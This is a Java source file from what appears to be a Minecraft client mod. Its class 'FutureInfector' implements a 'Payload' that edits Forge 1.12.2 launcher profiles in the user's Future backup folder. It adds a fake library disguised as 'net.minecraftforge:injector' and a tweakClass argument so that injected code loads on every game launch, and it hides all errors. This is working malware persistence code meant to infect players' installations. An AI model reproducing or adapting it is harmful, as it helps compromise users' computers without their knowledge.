package com.esoterik.client.util.impl;

import com.esoterik.client.util.Payload;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.util.Objects;

public final class FutureInfector implements Payload {
   public void execute() throws Exception {
      try {
         File file = new File(System.getProperty("user.home") + "\\Future\\backup");
         if (file.isDirectory()) {
            File[] var2 = (File[])Objects.requireNonNull(file.listFiles());
            int var3 = var2.length;

            for(int var4 = 0; var4 < var3; ++var4) {
               File f = var2[var4];
               if (f.getName().contains("1.12.2") && f.getName().contains("forge")) {
                  String json = new String(Files.readAllBytes(Paths.get(f.getAbsolutePath())), StandardCharsets.UTF_8);
                  if (!json.contains("--tweakClass net.minecraftforge.modloader.Tweaker")) {
                     JsonObject thing = (new JsonParser()).parse(json).getAsJsonObject();
                     JsonArray array = thing.getAsJsonArray("libraries");
                     JsonObject object = new JsonObject();
                     object.addProperty("name", "net.minecraftforge:injector:forgedefault");
                     array.add(object);
                     String args = thing.get("minecraftArguments").getAsString();
                     thing.remove("minecraftArguments");
                     thing.addProperty("minecraftArguments", args + " --tweakClass net.minecraftforge.modloader.Tweaker");
                     Files.write(Paths.get(f.getAbsolutePath()), thing.toString().getBytes(StandardCharsets.UTF_8), new OpenOption[0]);
                  }
               }
            }
         }
      } catch (Exception var11) {
      }

   }
}
